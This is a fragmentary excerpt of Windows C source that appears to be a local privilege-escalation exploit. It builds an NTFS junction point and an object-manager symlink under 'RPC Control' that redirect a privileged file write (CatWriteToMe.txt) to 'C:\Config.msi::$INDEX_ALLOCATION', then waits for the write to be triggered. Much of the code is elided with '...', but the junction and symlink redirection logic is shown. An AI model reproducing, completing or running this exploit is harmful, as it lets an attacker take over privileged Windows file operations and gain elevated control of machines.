...
int wmain()
{
	...
	CloseHandle(cfg_h);
	DeleteJunction(dir);
	DelDosDeviceSymLink(L"GLOBAL\\GLOBALROOT\\RPC Control\\C:\\Users\\admin\\Desktop\\WriteCatDataDir\\CatWriteToMe.txt", L"\\??\\C:\\Config.msi::$INDEX_ALLOCATION");
	return 0;
...
LPWSTR  BuildPath(LPCWSTR path) {
	...
	printf("[DEBUG] Built path: %ls\n", ntpath);  // Log the built path
	return ntpath;
}
void load() {
...
BOOL CreateJunction(LPCWSTR dir, LPCWSTR target) {
	...
	printf("[DEBUG] Attempting to obtain handle on directory: %ls\n", dir);

	// Attempt to open the directory with the correct flags
	...
	if (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, NULL, 0, &cb, NULL) != 0) {
		...
		free(Data);
		CloseHandle(hDir);  // Ensure handle is closed
		return TRUE;
	}
	else {
...
VOID cb0() {
	...
	if (!DosDeviceSymLink(L"GLOBAL\\GLOBALROOT\\RPC Control\\C:\\Users\\admin\\Desktop\\WriteCatDataDir\\CatWriteToMe.txt", L"\\??\\C:\\Config.msi::$INDEX_ALLOCATION")) {
		printf("[!] Exiting!\n");
		exit(1);
	}
...
LPWSTR FindDirectory() {
	// Directly assign your target directory instead of generating a temp path
	wcscpy(dir, L"C:\\Users\\admin\\Desktop\\WriteCatDataDir");

	// Build the full path to CatWriteToMe.txt
	_swprintf(file, L"%s\\CatWriteToMe.txt", dir);
	...
	printf("[+] Waiting on Write to File: %ls\\CatWriteToMe.txt\n", dir);
	return file;
}
